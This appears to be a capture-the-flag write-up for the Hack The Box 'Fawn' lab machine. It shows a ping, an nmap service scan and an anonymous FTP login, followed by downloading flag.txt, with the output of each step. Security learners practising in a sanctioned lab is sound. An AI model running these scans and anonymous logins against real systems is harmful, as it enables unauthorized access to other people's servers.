# [Fawn](https://app.hackthebox.com/starting-point)

## Target IP - 10.129.23.79

### Enumeration

Here we are checking if we are able to establish a connection with the target machine. In Conclusion we are able to establish a connection between our lab with the target.

**Command 1** - 

`ping 10.129.23.79`

**Output** -

```
PING 10.129.23.79 (10.129.23.79) 56(84) bytes of data.
64 bytes from 10.129.23.79: icmp_seq=1 ttl=62 time=2539 ms
64 bytes from 10.129.23.79: icmp_seq=2 ttl=62 time=1750 ms
64 bytes from 10.129.23.79: icmp_seq=3 ttl=62 time=710 ms
64 bytes from 10.129.23.79: icmp_seq=4 ttl=62 time=2188 ms
64 bytes from 10.129.23.79: icmp_seq=5 ttl=62 time=1395 ms
64 bytes from 10.129.23.79: icmp_seq=6 ttl=62 time=357 ms
^C
--- 10.129.23.79 ping statistics ---
7 packets transmitted, 6 received, 14.2857% packet loss, time 6224ms
rtt min/avg/max/mdev = 357.205/1489.906/2539.444/769.909 ms, pipe 3
```

Here we are scanning the target machine for the open ports or services. In conclusion we find out that there is service named as ftp which is open on 21/tcp port. We can try accessing the service.

**Command 2** -

`sudo nmap -sV 10.129.23.79 -p 1-100`

**Output** - 

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-16 21:39 IST
Nmap scan report for 10.129.23.79
Host is up (0.64s latency).
Not shown: 99 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.76 seconds
```


### Foothold

Here we tried to access the target machine through the ftp and tried the username as `anonymous` which worked for any password and then we got the ftp shell of the target machine.

**Command 3** -

`ftp 10.129.23.79`

**Output** - 

```
Connected to 10.129.23.79.
220 (vsFTPd 3.0.3)
Name (10.129.23.79:goobar07): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Here we printed the list of contents of the directory we are in so that we can get a clue. In conclusion we found the flag.txt which contains the flag of the machine.

**Command 4** -

`ls`

**Output** - 

```
229 Entering Extended Passive Mode (|||23519|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
```

Here we downloaded the flag.txt to our lab which then can be accessed to view its content.

**Command 5** - 

`get flag.txt`

**Output** -

```
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||63256|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |***********************************************************|    32      180.63 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (0.04 KiB/s)
```

### This machine has been pawned.
~goobar07
